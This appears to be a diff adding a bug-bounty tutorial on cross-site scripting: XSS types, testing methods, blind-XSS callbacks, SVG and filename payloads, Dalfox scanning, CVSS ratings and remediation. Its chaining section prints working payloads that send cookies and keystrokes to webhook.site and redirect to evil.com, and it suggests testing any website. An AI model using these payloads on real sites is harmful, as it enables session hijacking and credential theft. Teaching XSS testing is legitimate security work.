@@ -1,0 +1,291 @@
+                                                                                          Cross-Site Scripting (XSS)
+
+•	Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to data theft, session hijacking, defacement, and more.
+
+
+                                                                                            Types of XSS Attacks
+
+
+1. Stored XSS (Persistent XSS)
+•	The malicious script is permanently stored on the target server (e.g., in a database, forum post, or comment section).
+•	Whenever a user loads the affected page, the script executes in their browser.
+•	Example: A hacker injects a <script> tag into a comment box, which steals cookies from all visitors.
+
+
+2. Reflected XSS (Non-Persistent XSS)
+•	The malicious script is included in a URL and executed when the victim clicks the link.
+•	It is not stored on the server but reflected back to the user through HTTP responses.
+•	Example: A phishing email contains a link like:
+http://victim.com/search?q=<script>alert('XSS')</script>
+If the website does not sanitize input, the script executes.
+
+3. DOM-Based XSS
+•	The attack occurs when JavaScript modifies the DOM (Document Object Model) dynamically without proper validation.
+•	The script is executed client-side, without reaching the server.
+•	Example:  var userInput = location.hash;
+document.write(userInput); // Dangerous if not sanitized
+If the user visits http://example.com#<script>alert('XSS')</script>, the script executes in their browser.
+
+4. Blind XSS (a type of persistent XSS)
+•	Similar to Stored XSS, but the attacker does not immediately see the execution.
+•	The payload is stored and executed later in an admin panel or internal dashboard where an admin unknowingly triggers it.
+
+
+
+                                                                                              
+                                                                                                XSS Testing (GET-based)
+
+•	Test using URL parameters (GET method)
+
+•	Inject payloads directly into the URL , you will get pop up
+
+Example : http://testphp.vulnweb.com/artists.php?artist=<script>alert('XSS')</script>
+
+•	This is called Reflected xss
+
+
+                                                                                                  
+                                                                                                   XSS Testing (POST-Based)
+
+✅ Where to Test:
+•	On any website’s input fields
+•	Especially on pages where you submit a form
+•	This is called stored xss
+
+How to Test:
+1.	Find input fields like:
+o	Name
+o	Email
+o	Address
+o	Comment boxes , search bar’s etc..
+
+2.	Enter XSS payload in the field (e.g. name)
+              <script>alert('XSS')</script>
+
+3.	Submit the form (usually sends data via POST request).
+
+4.	After submission, if the input reflects back unsanitized → payload executes.
+
+ Example:
+•	Website: http://testphp.vulnweb.com/
+•	Login and go to profile update section.
+•	Enter payload in name field: <script>alert('XSS')</script>
+•	Click Update
+•	If the site is vulnerable, the page will show a popup after update, confirming XSS.
+
+
+
+
+                                                                                                Blind XSS Testing
+
+1.Visit and create an account on :
+Bxsshunter.io
+https://xsshunter.trufflesecurity.com/app/#/
+https://xss.report/
+
+2.After registration, the platform will give you a custom XSS payload’s like:
+<script src="https://yourusername.xss.ht"></script>
+
+•	Inject this payload into all input fields and parameters across the whole website.
+Example :http://testphp.vulnweb.com/artists.php?artist=<script src="https://yourusername.xss.ht"></script>
+
+
+
+                                                                                          XSS Testing via .svg File Upload
+Steps:
+1.In Windows, open Notepad
+2.Paste the XSS payload content :
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+      <script type="text/javascript">
+  alert("sai jain");
+  </script>
+</svg>
+
+3.	Save the file as: sai.svg
+
+4.	Go to any website that has a file upload feature
+(e.g., profile picture upload, document upload, etc.)
+
+5.	Upload the sai.svg file to the site.
+
+6.Try to open/view the uploaded file in the browser.
+
+✅ If the website renders SVG files directly without sanitization, you will see a popup, confirming that the site is vulnerable to Stored XSS via SVG upload.
+
+
+
+                                                                                       XSS Testing via File Name
+                                                                                       
+•	If a website uploads and displays file names without proper sanitization, you can trigger XSS by uploading files with malicious script tags in their names.
+
+</script><script>alert(1)</script>.jpg
+</script><script>alert(1)</script>.png
+</script><script>alert(1)</script>.txt
+</script><script>alert(1)</script>.pdf
+</script><script>alert(1)</script>.html
+
+
+                                                                                      XSS Testing via HTTP Headers
+
+Steps:
+1.	Visit the target website and browse through multiple pages.
+
+2.	Use Burp Suite to capture the HTTP requests.
+
+3.	In the request, inject XSS payloads into the following HTTP headers:
+User-Agent: <script>alert('XSS')</script>
+Referer: <script>alert('XSS')</script>
+X-Forwarded-For: <script>alert('XSS')</script>
+X-Requested-With: <script>alert('XSS')</script>
+
+4.	Forward the request through Burp.
+
+5.	If the application reflects header values without sanitization:
+o	✅ You may see a popup in the browser.
+o	Or, in Burp Suite's response, search for the keyword: XSS
+
+
+                                                                               
+                                                                                  Automatic XSS Scanning with Dalfox
+Installation:
+sudo apt install golang
+su root
+go install github.com/hahwul/dalfox/v2@latest
+cd go
+mv dalfox /usr/bin
+
+Usage Example: dalfox url http://testphp.vulnweb.com/?artist=
+✅ Dalfox automatically detects and tests for XSS in the given URL.
+•	It checks for reflected, stored, and DOM-based payload injection points.
+
+
+
+
+                                                                                                  XSS Chaining
+
+
+•	XSS chaining means combining XSS with other vulnerabilities or attack vectors to increase the impact.
+
+1. Open Redirect
+Use XSS to redirect the victim to a malicious site: 
+•	<script>location="https://evil.com/"</script>
+🔁 This can be used for phishing, token theft, or chaining with other attacks.
+
+2. Session Hijacking
+Use XSS to steal cookies or session tokens:
+•	<script>fetch("https://webhook.site/your-id?cookie=" + document.cookie);</script>
+
+•	 The stolen cookie will be sent to your Webhook.site URL, allowing potential session takeover if cookies aren't secured.
+
+3. Keylogger via XSS
+You can use XSS to log keystrokes from the victim’s browser:
+•	<script> document.onkeypress = function(e) { fetch("https://webhook.site/id?key=" + encodeURIComponent(e.key)); } </script>
+
+
+How to Use Webhook.site for XSS Payloads
+1.	Visit 🔗 https://webhook.site
+2.	It will generate a unique Webhook URL (ID) like:
+https://webhook.site/your-custom-id
+3.	Use this URL in your XSS payload.
+4.	Go back to Webhook.site, and you'll see the captured data in real-time.
+
+
+Where you can inject at :
+•	URL parameters (e.g., ?id=< payload >
+•	Any input field on the website.
+
+
+
+                                                                                    CVSS
+   
+    XSS Type	CVSS Score Priority
+    
+Reflected XSS	             6.1	P3 (Medium)
+Stored XSS	               8.8	P1 (Critical)
+Blind XSS	                 8.0 – 9.0	P1 (Critical)
+DOM-Based XSS	             6.1 – 7.5	P3 (Medium)
+                                                                                   
+
+                                                                            ]
+                                                                                      Impact
+
+🔴 Reflected XSS — Impact
+Session cookie theft
+Phishing via malicious links
+User redirection to fake pages
+Unauthorized actions using victim’s session
+
+🔴 Stored XSS — Impact
+Mass user account compromise
+Admin account takeover
+Theft of sensitive user data
+Persistent malicious content affecting all users
+Complete application trust breakdown
+
+🔴 Blind XSS — Impact
+Admin panel compromise
+Internal system access
+Credential theft of privileged users
+Exposure of sensitive logs and dashboards
+
+🔴 DOM-Based XSS — Impact
+Client-side session hijacking
+Data manipulation in browser
+Malicious redirects and phishing
+Bypass of client-side security controls
+
+
+                                                                                                 Remediation
+
+
+🔴 Reflected XSS — Remediation
+Encode user input before reflecting in responses
+Validate and sanitize all request parameters
+Avoid displaying raw user input
+Implement Content Security Policy (CSP)
+
+🔴 Stored XSS — Remediation
+Apply server-side input validation before storing data
+Use context-aware output encoding when rendering content
+Sanitize database-stored user input
+Use secure templating engines
+Enforce strong CSP headers
+
+🔴 Blind XSS — Remediation
+Sanitize inputs even if not immediately displayed
+Encode data in admin panels and internal dashboards
+Restrict script execution using CSP
+Secure admin cookies with HttpOnly and Secure flags
+
+🔴 DOM-Based XSS — Remediation
+Avoid unsafe JavaScript functions (innerHTML, eval, document.write)
+Use safe DOM APIs (textContent, innerText)
+Validate and encode data before inserting into DOM
+Implement strict CSP
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                           
